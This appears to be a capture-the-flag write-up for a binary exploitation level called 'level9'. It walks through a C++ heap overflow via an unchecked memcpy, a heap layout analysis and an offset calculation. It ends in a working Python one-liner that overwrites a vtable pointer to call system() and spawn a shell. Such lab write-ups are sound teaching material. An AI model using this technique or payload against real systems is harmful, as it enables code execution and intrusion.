
## Vulnerability Overview

Type : Heap overflow 

Core Issue: the program uses `memcpy()` to copy in a heap memory without checking the size 

------

## Program structure

class N : This program is c++ code , it contains a method calls setAnnotation which calls 

memcpy 
`  n->setAnnotation(argv[1]);`

## Heap layout

the program allocates 108 bytes for  each class object via 

```
N *n1 = new N(108 bytes);

N *n2 = new N(108 bytes);
```


## Memory layout 

```
0x804a000  [heap metadata]
0x804a004  [heap metadata: size = 0x71]----->object starts here  (0x08048848)

Chunk #1:
0x804a000  prev_size
0x804a004  size = 0x71
0x804a008  n1 vpointer (0x08048848) (0x804a008 + 0x4)
0x804a00c  n1 buffer starts here ← overflow starts here

Chunk #2:
0x804a070  prev_size
0x804a074  size = 0x71
0x804a078  n2 vpointer ← THIS is our target

what we have here is 

N1 : `:	0x00000000	0x00000071	0x08048848	0x67676767`
N2 : `0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000`
here both objects contains the same value (this is a vptr)

in this class we have a vfunction and both objects contains the same value because the vfunction are stored in vtable

```
## Exploitation strategy

## Calculate the offset

the buffer starts at (0x804a008 + 4) = 0x804a00c
because:
- n1 object starts at 0x804a008
- vpointer takes first 4 bytes
- buffer starts at 0x804a00c

so 
 ````
  buffer of first object starts from 0x804a00c
  the second object starts from 0x804a078
  offset =  0x804a078 - 0x804a00c = 6C(108 bytes)

````

## find address of system 
    gdb level9
    b main
    run fffffff
    p system : 0xb7d86060 (\x60\x60\xd8\xb7)

[system() address]  → replaces what vpointer points to
[A * 104]           → fills remaining buffer
[0x804a00c]         → overwrites n2's vpointer
[;/bin/sh]          → argument passed to system()

# # Solution 
`
    ./level9 $(python -c 'print "\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";/bin/sh"')
`